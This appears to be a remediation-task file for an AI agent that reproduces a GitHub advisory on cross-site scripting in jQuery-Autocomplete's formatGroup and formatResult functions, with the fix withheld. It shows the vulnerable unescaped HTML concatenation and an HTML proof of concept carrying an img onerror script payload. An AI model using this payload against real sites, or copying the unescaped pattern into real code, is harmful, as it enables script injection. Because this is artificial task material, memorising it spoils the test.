# Security finding

> **Source:** GitHub Security Advisory **GHSA-hvqh-jw65-wcpq** (CWE-79), published 2026-06-22.
> https://github.com/devbridge/jQuery-Autocomplete/security/advisories/GHSA-hvqh-jw65-wcpq
>
> This is the **detection report** handed to the agent — exactly what an upstream scanner /
> advisory tells you. The advisory's **"Patch" section (how it was fixed) has been deliberately
> removed**: the agent must produce the remediation itself. Nothing below prescribes a fix.

**Type:** Cross-site Scripting (XSS) — CWE-79
**Location:** `src/format.ts` — functions `formatGroup` and `formatResult`

### Summary

The default `formatGroup` and `formatResult` functions in `devbridge-autocomplete` concatenate values into HTML without escaping, allowing XSS when an attacker controls (or can taint) the suggestion data source.

### Details

**1. `formatGroup` — `category` is interpolated raw.**

`src/format.ts`:

```ts
function formatGroup(suggestion, category) {
    return '<div class="autocomplete-group">' + category + '</div>';
}
```

If `groupBy` is used and the grouping field of any suggestion contains HTML, that HTML is executed.

**2. `formatResult` — early-return branch returns `suggestion.value` raw.**

`src/format.ts`:

```ts
function formatResult(suggestion, currentValue) {
    if (!currentValue) {
        return suggestion.value;   // un-escaped
    }
    /* ... non-empty path escapes correctly ... */
}
```

The early-return branch is reached when `suggest()` renders with an empty `currentValue`, which happens with `minChars: 0` and a server that returns suggestions for an empty query. The returned string is concatenated into the container's `innerHTML`.

### PoC (formatGroup)

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>PoC: formatGroup XSS in jQuery-Autocomplete v2.0.0</title>
</head>
<body>
    <input id="ac" type="text" placeholder="Type 'a' to trigger" autocomplete="off">

    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
    <script src="dist/jquery.autocomplete.js"></script>
    <script>
        var poisoned = [
            { value: 'Apple',   data: { category: "<img src=x onerror=\"alert('XSS via formatGroup')\">" } },
            { value: 'Avocado', data: { category: 'Safe Group' } }
        ];

        $('#ac').devbridgeAutocomplete({
            lookup: poisoned,
            groupBy: 'category',
            minChars: 1
        });
    </script>
</body>
</html>
```

### Impact

XSS in pages that render attacker-controllable suggestion data. The actual impact depends on what the embedding page has access to (cookies, session tokens, DOM), per standard reflected/stored XSS.
